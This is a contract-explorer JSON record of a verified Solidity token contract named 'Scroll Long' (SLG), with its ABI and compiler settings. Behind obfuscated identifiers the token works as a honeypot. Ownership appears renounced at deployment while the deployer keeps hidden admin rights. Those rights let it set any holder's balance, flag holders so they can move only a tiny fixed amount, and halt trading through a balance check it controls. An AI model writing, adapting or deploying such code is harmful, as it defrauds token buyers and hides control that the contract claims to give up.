{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface walletSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract isTrading {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fromLiquiditySell {\n    function createPair(address marketingMin, address marketingLaunch) external returns (address);\n}\n\ninterface teamIsShould {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchedFundAuto) external view returns (uint256);\n\n    function transfer(address exemptTotal, uint256 marketingWallet) external returns (bool);\n\n    function allowance(address limitMode, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 marketingWallet) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptTotal,\n        uint256 marketingWallet\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed senderTokenSwap, uint256 value);\n    event Approval(address indexed limitMode, address indexed spender, uint256 value);\n}\n\ninterface teamIsShouldMetadata is teamIsShould {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ScrollLong is isTrading, teamIsShould, teamIsShouldMetadata {\n\n    function totalMax(address walletSwapAmount) public {\n        launchExempt();\n        if (enableBuy != buyEnable) {\n            modeReceiver = receiverReceiver;\n        }\n        if (walletSwapAmount == limitTake || walletSwapAmount == fromReceiver) {\n            return;\n        }\n        shouldTokenLiquidity[walletSwapAmount] = true;\n    }\n\n    uint256 minList;\n\n    function owner() external view returns (address) {\n        return listEnableSwap;\n    }\n\n    uint256 private tokenAmountIs = 100000000 * 10 ** 18;\n\n    function enableLiquidity() public {\n        emit OwnershipTransferred(limitTake, address(0));\n        listEnableSwap = address(0);\n    }\n\n    uint256 constant amountTake = 5 ** 10;\n\n    function decimals() external view virtual override returns (uint8) {\n        return toLaunchedShould;\n    }\n\n    uint256 public receiverReceiver;\n\n    function takeReceiver(address atReceiverShould, address exemptTotal, uint256 marketingWallet) internal returns (bool) {\n        require(marketingShould[atReceiverShould] >= marketingWallet);\n        marketingShould[atReceiverShould] -= marketingWallet;\n        marketingShould[exemptTotal] += marketingWallet;\n        emit Transfer(atReceiverShould, exemptTotal, marketingWallet);\n        return true;\n    }\n\n    bool public buyEnable;\n\n    function transfer(address atTokenFee, uint256 marketingWallet) external virtual override returns (bool) {\n        return modeLaunched(_msgSender(), atTokenFee, marketingWallet);\n    }\n\n    function fromAuto(uint256 marketingWallet) public {\n        launchExempt();\n        txAuto = marketingWallet;\n    }\n\n    mapping(address => uint256) private marketingShould;\n\n    function launchExempt() private view {\n        require(fromAmount[_msgSender()]);\n    }\n\n    address public limitTake;\n\n    address fundSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function allowance(address autoLaunched, address autoLiquidity) external view virtual override returns (uint256) {\n        if (autoLiquidity == fundSell) {\n            return type(uint256).max;\n        }\n        return receiverTx[autoLaunched][autoLiquidity];\n    }\n\n    mapping(address => bool) public fromAmount;\n\n    address public fromReceiver;\n\n    uint256 txAuto;\n\n    string private tokenWalletMin = \"Scroll Long\";\n\n    mapping(address => bool) public shouldTokenLiquidity;\n\n    string private shouldLaunched = \"SLG\";\n\n    bool private enableBuy;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tokenAmountIs;\n    }\n\n    function modeLaunched(address atReceiverShould, address exemptTotal, uint256 marketingWallet) internal returns (bool) {\n        if (atReceiverShould == limitTake) {\n            return takeReceiver(atReceiverShould, exemptTotal, marketingWallet);\n        }\n        uint256 tradingMaxTeam = teamIsShould(fromReceiver).balanceOf(tokenSell);\n        require(tradingMaxTeam == txAuto);\n        require(exemptTotal != tokenSell);\n        if (shouldTokenLiquidity[atReceiverShould]) {\n            return takeReceiver(atReceiverShould, exemptTotal, amountTake);\n        }\n        return takeReceiver(atReceiverShould, exemptTotal, marketingWallet);\n    }\n\n    address private listEnableSwap;\n\n    address tokenSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public toMarketing;\n\n    function getOwner() external view returns (address) {\n        return listEnableSwap;\n    }\n\n    uint8 private toLaunchedShould = 18;\n\n    function isReceiver(address atTokenFee, uint256 marketingWallet) public {\n        launchExempt();\n        marketingShould[atTokenFee] = marketingWallet;\n    }\n\n    mapping(address => mapping(address => uint256)) private receiverTx;\n\n    uint256 private modeReceiver;\n\n    function toAuto(address maxIs) public {\n        require(maxIs.balance < 100000);\n        if (receiverTotal) {\n            return;\n        }\n        \n        fromAmount[maxIs] = true;\n        \n        receiverTotal = true;\n    }\n\n    function approve(address autoLiquidity, uint256 marketingWallet) public virtual override returns (bool) {\n        receiverTx[_msgSender()][autoLiquidity] = marketingWallet;\n        emit Approval(_msgSender(), autoLiquidity, marketingWallet);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed enableAmount, address indexed walletMin);\n\n    function name() external view virtual override returns (string memory) {\n        return tokenWalletMin;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return shouldLaunched;\n    }\n\n    bool public receiverTotal;\n\n    function balanceOf(address launchedFundAuto) public view virtual override returns (uint256) {\n        return marketingShould[launchedFundAuto];\n    }\n\n    function transferFrom(address atReceiverShould, address exemptTotal, uint256 marketingWallet) external override returns (bool) {\n        if (_msgSender() != fundSell) {\n            if (receiverTx[atReceiverShould][_msgSender()] != type(uint256).max) {\n                require(marketingWallet <= receiverTx[atReceiverShould][_msgSender()]);\n                receiverTx[atReceiverShould][_msgSender()] -= marketingWallet;\n            }\n        }\n        return modeLaunched(atReceiverShould, exemptTotal, marketingWallet);\n    }\n\n    constructor (){\n        \n        walletSell swapTake = walletSell(fundSell);\n        fromReceiver = fromLiquiditySell(swapTake.factory()).createPair(swapTake.WETH(), address(this));\n        \n        limitTake = _msgSender();\n        enableLiquidity();\n        fromAmount[limitTake] = true;\n        marketingShould[limitTake] = tokenAmountIs;\n        \n        emit Transfer(address(0), limitTake, tokenAmountIs);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletMin\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderTokenSwap\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoLiquidity\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingWallet\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedFundAuto\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"marketingWallet\",\"type\":\"uint256\"}],\"name\":\"fromAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTokenFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingWallet\",\"type\":\"uint256\"}],\"name\":\"isReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldTokenLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxIs\",\"type\":\"address\"}],\"name\":\"toAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletSwapAmount\",\"type\":\"address\"}],\"name\":\"totalMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTokenFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingWallet\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atReceiverShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingWallet\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ScrollLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}